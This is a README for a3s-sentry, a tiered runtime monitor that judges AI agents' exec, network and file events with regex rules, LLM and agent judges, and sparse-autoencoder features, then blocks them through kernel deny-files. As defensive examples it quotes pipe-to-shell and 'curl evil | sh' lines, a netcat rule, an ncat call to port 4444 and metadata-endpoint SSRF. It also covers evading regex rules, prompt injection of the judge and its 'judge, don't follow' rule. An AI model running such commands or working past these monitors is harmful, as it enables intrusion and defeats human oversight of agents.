# a3s-sentry

**Tiered runtime security control for AI agents.** Sentry is the policy brain for
[a3s-observer](https://github.com/A3S-Lab/Observer): it reads observer's event stream — what an agent
ran, sent, escalated — judges each event through **three escalating tiers**, and pushes a block down
to observer's kernel guards when something is dangerous. Zero changes to the agent; the kernel does
the enforcing.

```
observer NDJSON ─▶ L1 rules ──escalate─▶ L2 LLM ──escalate─▶ L3 a3s-code agent
   (what the          │ block               │ block              │ block
    agent did)        ▼                      ▼                    ▼
                   Enforcer ──▶ observer deny-files ──▶ kernel denies (EPERM)
```

The three tiers trade cost for depth, so expensive judgment runs only on what cheap judgment can't settle:

| tier | mechanism | latency | runs on |
|---|---|---|---|
| **L1** | deterministic regex rule engine (ACL-configurable) | µs | every event |
| **L2** | a fast LLM classifier (OpenAI-compatible endpoint) | ~100s ms | events L1 escalates |
| **L3** | a deep [a3s-code](https://github.com/AI45Lab/Code) agent with security skills | seconds–minutes | events L2 escalates |
| **SAE** | a Sparse Autoencoder over the model's residual stream, tapped in-TEE by [a3s-power](https://github.com/A3S-Lab/Power) | ~ms | model-output `LlmActivations` events |

L1 catches the unambiguous cases outright and flags the rest; L2 gives a fast second opinion; L3
actually investigates — reading the event in context, considering the attack chain — for the
genuinely hard cases. Each tier is a `Judge`, so the set is swappable and unit-tested.

A fourth, parallel tier — **SAE** — judges a different signal entirely: the model's *own output*,
by its internal features rather than its (obfuscable) text. See
[SAE — mechanistic interpretability](#sae--mechanistic-interpretability-of-model-output).

## How it fits a3s-observer

Sentry is exactly the *"your controller"* piece observer's README leaves to you:

```
events (NDJSON) → sentry (L1/L2/L3 rules) → deny-file → observer guard → kernel denies (EPERM)
```

Observer provides the **signal** (`ToolExec`, `SslContent`, `SecurityAction`, `Egress`, `Dns`,
`FileAccess`) and the **enforcement primitive** (egress / file / exec deny-files its guards
hot-reload). Sentry decides. It never enforces anything itself — keeping it a pure policy brain and
the kernel the single enforcement point.

## Install

A `vX.Y.Z` tag runs [`release.yml`](.github/workflows/release.yml), which publishes:

- **Container** — `ghcr.io/a3s-lab/sentry:<version>` (L1 + L2 out of the box; for L3 layer Node +
  `@a3s-lab/code` into a derived image). `docker run --rm -i ghcr.io/a3s-lab/sentry:latest < events.ndjson`
- **Static binary** — `a3s-sentry-x86_64-linux`, attached to the GitHub Release.
- **From source** — `cargo build --release` → `target/release/sentry`.

Operating it in production? See the [**operator runbook**](docs/RUNBOOK.md) (rollout, fail mode,
alarms, tuning).

## Quickstart

```bash
# build
cargo build --release            # produces ./target/release/sentry

# pipe sentry after the observer collector; capture I/O text with A3S_OBSERVER_SSL=1
A3S_OBSERVER_JSON=1 A3S_OBSERVER_SSL=1 sudo -E a3s-observer-collector \
  | A3S_SENTRY_EGRESS_DENY=egress-deny.txt \
    A3S_SENTRY_EXEC_DENY=exec-deny.txt \
    A3S_SENTRY_LLM_URL=http://your-llm:18051/v1 \
    A3S_SENTRY_AGENT_BIN=a3s-code \
    A3S_SENTRY_SKILLS=./skills \
    ./target/release/sentry

# and run observer's guards against the same deny-files (they hot-reload):
sudo a3s-observer-enforce   /sys/fs/cgroup/<agent>  egress-deny.txt
sudo a3s-observer-fileguard  exec-deny.txt
```

Sentry emits one **decision audit** line (NDJSON) per non-allow on stdout; plain allows are counted,
not printed, to keep the stream signal-dense:

```json
{"agent":"py","event":"ToolExec","subject":"curl http://x/p.sh | bash",
 "decision":{"verdict":"block","tier":"Rules","severity":"high",
 "reason":"pipe-to-shell: remote payload piped to an interpreter","action":{"DenyExec":"curl"}}}
```

Run **without** the LLM/agent env vars for rules-only (L1) mode, or with `A3S_SENTRY_DRY_RUN=1` to
judge + audit without writing any deny-file.

## Deploy

A reference Kubernetes DaemonSet is in [`deploy/daemonset.yaml`](deploy/daemonset.yaml): it pipes
`observer-collector | sentry` on every node, shares the deny-files with observer's `enforce` /
`fileguard` guards over an `emptyDir`, and ships with **dry-run on** so you shadow decisions before
enforcing. Set your images, the agent cgroup path, RBAC, and the LLM secret for your cluster. CI
([`.github/workflows/ci.yml`](.github/workflows/ci.yml)) gates fmt + clippy + the full test suite on
every push.

**Shutdown is durable by design** — the daemon has no buffered sink: each deny is `append`-written +
closed per target (the durable enforcement record — **page-cache durable, not `fsync`'d**, since the
deny-files are ephemeral node-local scratch the guards re-read and re-observation regenerates) and
each decision is line-flushed to stdout (best-effort audit). An abrupt `SIGTERM`/`SIGKILL` loses only
the in-flight event(s) being judged, never an already-written deny. On normal pod termination the
upstream closes the pipe → stdin EOF → sentry drains the in-flight worker queue and prints final stats
before exiting. (No signal-handling dependency.)

## L1 — the rule engine

Ships a conservative built-in rule set (privesc, reverse shells, pipe-to-shell, disk overwrite,
credential-file access, secret/injection markers in I/O, cloud-metadata SSRF). Only the unambiguous
cases `block`; the rest `escalate` to L2/L3 rather than guess. Extend or override with an ACL policy
(`A3S_SENTRY_POLICY=policy/rules.acl`):

```hcl
rules = [
  { name = "no-netcat", on = "ToolExec", match = "(?i)\\b(ncat|netcat)\\b",
    verdict = "block", severity = "medium", reason = "netcat", action = "deny-exec" },
]
```

First match wins; no match = allow. See [`policy/rules.acl`](policy/rules.acl).

## Dynamic policy & embedding

**Hot-reload.** The policy file is watched — rewrite it from any program (a controller, your config
system, an operator) and the rules update **live within ~2s, no restart**. A parse error keeps the
current rules, so a bad edit never disarms the engine. This is the language-agnostic way to drive
sentry dynamically: your logic, in any language, rewrites the ACL.

**Embed it.** sentry is a library — build the pipeline in-process and apply config changes at runtime:

```rust
use a3s_sentry::{LiveRules, LlmJudge, Pipeline, Severity};
use std::{sync::Arc, time::Duration};

let rules = Arc::new(LiveRules::new(Some("rules.acl".into()))?);   // hot-reloadable
let pipeline = Pipeline::new(rules.clone())                        // L1
    .with_l2(Arc::new(LlmJudge::new("http://llm:18051/v1", "glm", None, Duration::from_secs(10))))
    .speculate_above(Some(Severity::High))   // run L2 + L3 in parallel on high-risk
    .fail_closed(false);

let decision = pipeline.evaluate(&observed_event);   // your own event source
rules.reload()?;   // force-apply config changes now (e.g. on a signal / admin API)
```

Every tier is a `Judge` trait impl, so you can swap L1/L2/L3 for your own (a different model, an
in-house ruleset) and keep the escalation machinery.

## SDKs (Python · TypeScript)

**Native, in-process** SDKs — the Rust L1/L2/L3 judge embedded via PyO3 (Python) and napi-rs
(TypeScript), the same model as [`@a3s-lab/code`](https://github.com/A3S-Lab/Code). Build the judge
from one ACL config (the daemon's whole config in a single file — rules + L2/L3 backends + sinks) and
evaluate observer events in-process; no daemon, no subprocess. Each is verified by judging real events
through the embedded engine (a cloud-metadata SSRF → `block`/`DenyEgress`; an SDK-authored ACL rule
firing at `tier=Rules`).

- **Python** — [`sdk/python`](sdk/python) (`pip install a3s-sentry`):

  ```python
  from a3s_sentry import Sentry, egress, tool_exec

  sentry = Sentry.create("sentry.acl")               # ACL file path or content
  d = sentry.evaluate(egress(1, "169.254.169.254", 80))   # cloud-metadata SSRF
  print(d.verdict, d.action.kind, d.action.target)   # block DenyEgress 169.254.169.254
  d2, enforced = sentry.evaluate_and_enforce(tool_exec(2, ["/usr/bin/ncat", "h", "4444"]))
  ```

- **TypeScript** — [`sdk/typescript`](sdk/typescript) (`@a3s-lab/sentry`, Node ≥12):

  ```ts
  import { Sentry, egress } from "@a3s-lab/sentry";

  const sentry = Sentry.create("sentry.acl");
  const d = sentry.evaluate(egress(1, "169.254.169.254", 80));
  if (d?.verdict === "block") console.log(d.reason, d.action); // { kind: "DenyEgress", target: "…" }
  ```

The `sentry.acl` config — rules, optional `llm {}` (L2) / `agent {}` (L3) backends, and `deny {}`
sinks — is shown in each SDK's README. Event builders (`egress`, `toolExec`, `dns`, `fileAccess`,
`sslContent`, `securityAction`) construct the event JSON `evaluate` takes.

## Speculative parallelism

By default the tiers run serially (L2, then L3 only if L2 escalates). Set `A3S_SENTRY_SPECULATE=high`
(or `.speculate_above(Some(Severity::High))`) and, when **L1 escalates at or above that severity, L2
and L3 run concurrently** — L3's deep look starts immediately instead of after L2. A fast L2 `Block`
short-circuits for response time; otherwise L3's deeper verdict (already running, so ready sooner) is
authoritative. High-risk events get the thorough check without paying the serial L2+L3 latency — at
the cost of always running L3 for them (the speculation trade).

## L3 — deep agent investigation

L3 is a real [a3s-code](https://github.com/A3S-Lab/Code) agent that *investigates* a flagged event —
loading the security skills and reasoning about the actor, the attack chain, and blast radius —
rather than making a single classification call like L2. Enable it via the bridge script:

```bash
npm i -g @a3s-lab/code           # the agent SDK
… | A3S_SENTRY_AGENT_BIN=$PWD/scripts/l3-agent.mjs \
    A3S_SENTRY_SKILLS=$PWD/skills \
    A3S_SENTRY_L3_URL=http://your-llm:18051/v1 A3S_SENTRY_L3_KEY=… A3S_SENTRY_L3_MODEL=glm5.1-w4a8 \
    a3s-sentry
```

`scripts/l3-agent.mjs` runs the a3s-code agent with the [`skills/`](skills) playbooks and returns a
`{verdict,severity,reason}` JSON. L3 is reached when **L2 escalates** (the LLM says it genuinely
can't tell), **directly from L1** if no L2 is configured, or **speculatively** alongside L2 on
high-risk events. It uses `A3S_SENTRY_L3_*` (falling back to `A3S_SENTRY_LLM_*`), so L3 can run a
stronger/different model than L2 — or run without L2 at all. Validated against a live a3s-code + GLM:
an SSH-private-key read → `block` with the agent reasoning *"a generic Python interpreter, not a known
SSH client… key material can be transmitted outbound after being loaded into memory."*

## SAE — mechanistic interpretability of model output

The L1–L3 tiers judge what the agent *did* (observer's syscall / network events). The **SAE tier**
judges what the model *said* — its output — and does it **white-box**: instead of reading the
completion text (which an attacker can base64/cipher-obfuscate), it reads the model's own
**residual-stream features**.

[a3s-power](https://github.com/A3S-Lab/Power) serves the model inside a TEE, taps the residual stream
at one layer, encodes it with a Sparse Autoencoder, and emits **only** the sparse `(feature_id,
activation)` pairs as an `LlmActivations` event — the prompt/completion plaintext never leaves the
enclave. Sentry's `SaeJudge` scores those features against a labeled feature dictionary:

- **white-box** — judges the model's *internal concepts*, so an obfuscated harmful output still lights
  its concept feature;
- **confidential** — sees only feature ids / activations, never the text (the model runs in the TEE);
- **explainable** — the score is *linear in named features*, decomposed into ranked drivers
  (`exploit-code-synthesis (#8801) → 0.82`), not a second black box.

```hcl
sae { dict = "features.json"  escalate_at = 0.3  block_at = 0.6 }   # mech-interp tier (optional)
```

The feature dictionary (`feature_id → {concept, category, weight, severity}`) is an offline artifact:
train or adopt an SAE for the served model, probe + label its safety-relevant features, and
causal-validate each label (ablate the feature, confirm the score moves). Model-output events route to
this tier (not the rule chain); an SAE escalation can still defer to the deep L3 agent. The `Decision`
carries the explainability in `explain` (`SaeScore`: per-category scores + ranked drivers) for the
dashboard. Output text has no kernel deny target, so an SAE block rides the enclosing
`ToolExec`/`Egress` action event. a3s-power's side of the chain is planned in
[its `docs/sae-interpretability-plan.md`](https://github.com/A3S-Lab/Power/blob/main/docs/sae-interpretability-plan.md).

## Config (env)

| var | effect |
|---|---|
| `A3S_SENTRY_POLICY` | extra L1 rules (ACL); built-ins always apply; **hot-reloaded** (~2s) |
| `A3S_SENTRY_LLM_URL` | enable L2; OpenAI-compatible chat base URL (`…/v1`) |
| `A3S_SENTRY_LLM_MODEL` / `_KEY` | L2 model name / bearer token |
| `A3S_SENTRY_AGENT_BIN` | enable L3; the agent command (e.g. `scripts/l3-agent.mjs`) |
| `A3S_SENTRY_SKILLS` | L3 security-skills directory (see [`skills/`](skills)) |
| `A3S_SENTRY_L3_URL` / `_KEY` / `_MODEL` | L3 agent's LLM (falls back to `A3S_SENTRY_LLM_*`) |
| `A3S_SENTRY_EGRESS_DENY` / `_FILE_DENY` / `_EXEC_DENY` | observer deny-files to append blocks to |
| `A3S_SENTRY_FAIL_CLOSED` | unresolved escalations **block** (default: fail-open / allow) |
| `A3S_SENTRY_SPECULATE` | run L2+L3 **in parallel** when L1 escalates at ≥ this severity (e.g. `high`) |
| `A3S_SENTRY_LLM_TIMEOUT` | L2 request timeout in seconds (default **30**; reasoning models take ~15–30s) |
| `A3S_SENTRY_AGENT_TIMEOUT` | L3 investigation timeout in seconds (default 120) |
| `A3S_SENTRY_WORKERS` / `_QUEUE` | L2/L3 worker threads (default 4) + escalation queue depth (default 256) |
| `A3S_SENTRY_DRY_RUN` | judge + audit, never write a deny-file |
| `A3S_SENTRY_METRICS_ADDR` | serve Prometheus `/metrics` + `/healthz` on this `ip:port` (e.g. `0.0.0.0:9100`; off by default) |

## Observability

Set `A3S_SENTRY_METRICS_ADDR` (e.g. `0.0.0.0:9100`) to expose, with no extra dependency:

- **`GET /metrics`** — Prometheus counters: `sentry_events_total`, `sentry_blocked_total`,
  **`sentry_overload_degraded_total`** (escalations that fell through to the fail mode), and
  **`sentry_enforce_failed_total`** (a block whose deny-write errored). For a *fail-open* control those
  last two are the ones to **alarm on** — both mean a block did **not** take effect.
- **`GET /healthz`** — `200 ok` while the process is alive (the k8s liveness/readiness probe in
  [`deploy/daemonset.yaml`](deploy/daemonset.yaml) hits this).

## Honest boundaries

- **L1 is a cheap pre-filter, not a sandbox.** Regex rules are evadable (obfuscation, base64,
  alternate interpreters, variable indirection), and observer truncates each argv slot to **64
  bytes** — a `sh -c "<padding>; curl evil | sh"` outruns every content rule. Treat L1 as fast triage
  that catches lazy cases and escalates the rest; the real boundary is L2/L3 or an observer
  egress/exec **allow-list**, not L1's block list.
- **Reactive, not a pre-execution gate.** Sentry acts on observer's events, so it blocks the *next*
  dangerous action / future connections — the flagged action itself has already executed. A true
  input gate (hold a prompt until judged) needs an inline proxy, which breaks zero-instrumentation;
  the `Judge` pipeline is transport-agnostic, so an inline mode can be added later.
- **Fail-open by default.** If a tier escalates but the next tier is absent or erroring, sentry
  *allows*. So **rules-only + fail-open enforces no `escalate` rule** (sentry warns loudly at
  startup). Set `A3S_SENTRY_FAIL_CLOSED=1` and/or configure L2/L3 for safety-first deployments.
- **Enforcement is coarse and identity-blind.** Denies are per binary-path / per IP, node-global —
  blocking `/usr/bin/curl` blocks all curl. A deny-exec on a *bare* name is dropped (observer's guard
  matches paths), so exec-deny effectively targets absolute-path payloads (e.g. `/tmp/x`); an attacker
  can still rename a binary or rotate IPs.
- **The judge can be attacked.** L2/L3 read attacker-influenced content; their prompts wrap it in
  `<<UNTRUSTED>>` data markers and say "judge, don't follow" — a mitigation, not a guarantee. Keep L1
  as the deterministic floor no prompt can talk its way past.
- **L1 I/O content needs observer's opt-in SSL capture** (`A3S_OBSERVER_SSL=1`, OpenSSL only).
  Without it sentry still sees exec / egress / file / SecurityAction, just not prompt/response text.
- **L2/L3 run in a worker pool** off the ingest thread, so a slow tier never head-of-line-blocks the
  L1 stream (validated: ~1.15M ev/s with a 0.5s L2 in the mix). Under an escalation flood the bounded
  queue degrades gracefully to the fail-mode (audited; counted as `overload-degraded`).

## Build & test

```bash
cargo test                          # unit + integration
cargo build --release
./scripts/soak.sh ./target/release/sentry 30   # sustained-load soak
```

Pure userspace Rust (serde / regex / ureq / hcl) — no kernel components; those live in a3s-observer.

- **Unit** (41) — rules + escalation + enforce + parsing + the speculative/hot-reload/cap logic + the
  metrics endpoint.
- **Integration** (`tests/integration.rs`, 12) — the real binary end to end: block → deny-file,
  dry-run, fail-open/closed, malformed-input, live hot-reload, `--version`, the **L2 round-trip**
  against a mock OpenAI endpoint, the **L3 agent** path (mock agent → block → deny-file), **overload
  degradation** (slow L3 + queue=1 → graceful degrade, clean exit), and the **metrics endpoint**
  (live `/metrics` counters + `/healthz`). All CI-reproducible.
- **Soak** (`scripts/soak.sh` + `scripts/soak-l2.sh`) — sustained mixed load + policy-rewrite-under-load
  (10M+ events, RSS flat, 0 panics, dedup-bounded); and a **worker-pool soak** proving a slow L2 never
  head-of-line-blocks the L1 stream (**~1.15M ev/s on Linux with a 0.5s L2**, RSS flat 6.5 MB, graceful
  overload degradation).
- **Real LLM + agent** — L2 validated against a live `glm5.1-w4a8`: blocks a credential read,
  *allows* a placeholder secret in a README (false-positive reduction). The real model (~16s — a
  reasoning model) exposed that the old hardcoded 10s timeout would fail **open** on real threats;
  it's now 30s by default and tunable. **L3 validated against a real a3s-code agent**: an SSH-private-key
  read → a deep, attack-chain-aware `block` (the agent reasoned about the actor not being a known SSH
  client and the key being exfiltratable from memory) — genuinely deeper than L2's single classification.
- **Accuracy** — measured on a 69-event labeled corpus ([`eval/`](eval), `cargo run --example eval`):
  **L1 alone 47.8% recall / 100% precision / 0% FP**; **L1+L2 (live GLM) 95.7% recall / 100% precision /
  0% FP**. The eval found + fixed 3 real issues (bare `rm -rf /` missed, `.env` uncovered, OOB-exfil
  domains too-lenient). Numbers are honest, not aspirational — the corpus + harness are in the repo.

## Layout

| file | role |
|---|---|
| `verdict.rs` | `Decision` / `Verdict` / `Severity` / `EnforceAction` |
| `event.rs` | parse observer NDJSON into the judged `Event` |
| `rules.rs` | **L1** rule engine + built-in defaults |
| `llm.rs` | **L2** LLM classifier |
| `agent.rs` | **L3** a3s-code investigator |
| `pipeline.rs` | the `Judge` trait + L1→L2→L3 escalation |
| `enforce.rs` | append blocks to observer deny-files |
| `metrics.rs` | Prometheus `/metrics` + `/healthz` endpoint |
| `bin/sentry.rs` | the daemon (stdin → judge → enforce → audit) |
| `deploy/daemonset.yaml` | reference k8s DaemonSet (observer → sentry → guards) |
| `.github/workflows/ci.yml` | CI: fmt + clippy + full test suite |

## License

MIT
